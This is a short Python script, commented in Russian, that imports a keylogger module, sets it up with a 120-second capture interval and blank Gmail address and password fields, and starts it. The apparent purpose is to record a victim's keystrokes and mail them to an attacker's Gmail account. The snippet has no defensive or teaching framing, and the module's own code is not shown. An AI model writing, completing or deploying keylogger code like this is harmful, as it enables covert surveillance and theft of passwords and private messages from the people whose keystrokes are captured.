import keylogger

my_keylogger = keylogger.Keylogger(120, "@gmail.com", "")  # 120 секунд (время сбора данных) gmail/password
my_keylogger.start()
